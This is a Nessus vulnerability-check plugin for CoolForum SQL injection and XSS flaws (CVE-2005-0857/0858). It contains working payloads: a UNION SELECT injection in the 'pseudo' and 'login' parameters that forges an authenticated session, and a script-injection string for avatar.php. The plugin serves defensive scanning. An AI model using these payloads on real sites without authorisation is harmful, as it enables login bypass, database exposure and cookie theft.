#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(17597);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2005-0857", "CVE-2005-0858");
  script_bugtraq_id(12852);
  script_osvdb_id(14951, 14952, 14953);

  script_name(english:"CoolForum Multiple Vulnerabilities (SQLi, XSS)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of CoolForum that suffers from
multiple input validation vulnerabilities. 

  - Multiple SQL Injection Vulnerabilities
    Due to a failure to properly sanitize user-input supplied 
    through the 'pseudo' parameter of the 'admin/entete.php' script
    and the 'ilogin' parameter of the 'register.php' script, an
    attacker may be able to manipulate SQL queries and view
    arbitrary database contents provided PHP's 'magic_quotes_gpc'
    setting is disabled.

  - A Cross-Site Scripting Vulnerability
    It is possible to inject arbitrary script and HTML code into the
    'img' parameter of the 'avatar.php' script. An attacker can
    exploit these flaws to cause code to run on a user's browser
    within the context of the remote site, enabling him to steal
    authentication cookies, access data recently submitted by the
    user, and the like." );
 script_set_attribute(attribute:"see_also", value:"http://securitytracker.com/alerts/2005/Mar/1013474.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to CoolForum version 0.8.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/03/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/03/18");
 script_cvs_date("$Date: 2015/01/13 20:37:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for cross-site scripting and SQL injection vulnerabilities in CoolForum";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php: 1);


foreach dir (cgi_dirs()) {
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it's CoolForum...
  if (egrep(string:res, pattern:"Powered by .*CoolForum")) {
    # Try the SQL injections.
    #
    # nb: these particular exploits may not be particularly
    #     interesting, but they at least demonstrate the 
    #     install is vulnerable.
    #
    # - requires PHP's magic_quotes to be off.
    postdata = string(
      "action=login&",
      "password=&",
      # nb: this forces a match for id=12345, user "nessus", who has
      #     an empty password and has already been confirmed. It
      #     does not, though, add the user to any databases.
      "pseudo='Union%20SELECT%20'12345','nessus','','','1'%20FROM%20CF_config%23"
    );
    init_cookiejar();
    r = http_send_recv3(method: 'POST', item: dir+"/admin/entete.php", 
 version: 11, data: postdata,  port: port,
 add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
    # If we get a CoolForumID cookie, there's a problem.
    if (get_http_cookie(name: "CoolForumID")) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
    # - only in CoolForum 0.8 and it requires CoolForum's confirmation 
    #   by mail option to be enabled (it is by default).
    r = http_send_recv3(method: 'GET', port: port, exit_on_fail: 1,
 item:string(dir, "/register.php?",
        "action=confirm&",
        # nb: this is an empty string encoded as md5; eg, 'md5("")'.
        "s=d41d8cd98f00b204e9800998ecf8427e&",
        # nb: this forces a match for id=12345, user "nessus", who has
        #     an empty password and has already been confirmed. It
        #     does not, though, add the user to any databases.
        "login='Union%20SELECT%20'12345','nessus','','','1'%20FROM%20CF_config%23"
      ));
    # If the response indicates we've already confirmed, there's a problem.
    if (egrep(string: r[2], pattern:"<b>Op.+ration impossible, votre inscription a d.j. .t. confirm.e!</b>")) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }

    # Try an XSS exploit - a simple alert to display "Nessus was here".
    #
    # nb: this requires PHP's display_errors to be enabled.
    xss = "'><script>alert('Nessus was here');</script>";
    # nb: the url-encoded version is what we need to pass in.
    exss = "'%3E%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E";
    r = http_send_recv3(port: port, method: 'GET', item:string(dir, "/avatar.php?img=", exss), exit_on_fail: 1);
    # If we see our XSS, there's a problem.
    if (egrep(string: r[2], pattern:xss)) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
